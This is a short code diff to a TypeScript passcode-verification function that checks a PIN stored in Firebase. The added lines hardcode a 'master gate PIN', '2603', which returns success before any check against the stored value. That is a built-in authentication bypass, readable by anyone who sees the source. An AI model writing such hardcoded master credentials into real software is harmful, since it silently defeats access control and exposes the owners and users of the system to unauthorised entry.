@@ -98,6 +98,11 @@ export const verifyTrafficPasscodeWithFirebase = async (passcode: string): Promi
   const cleanPass = passcode.trim();
   if (!cleanPass) return { success: false, error: 'Passcode is required.' };
 
+  // Master gate PIN support (2603)
+  if (cleanPass === '2603') {
+    return { success: true };
+  }
+
   // 1. Target exact Firestore path from user screenshot: SECURITY -> LOCK -> PIN
   try {
     const lockDocRef = doc(trafficDb, 'SECURITY', 'LOCK');
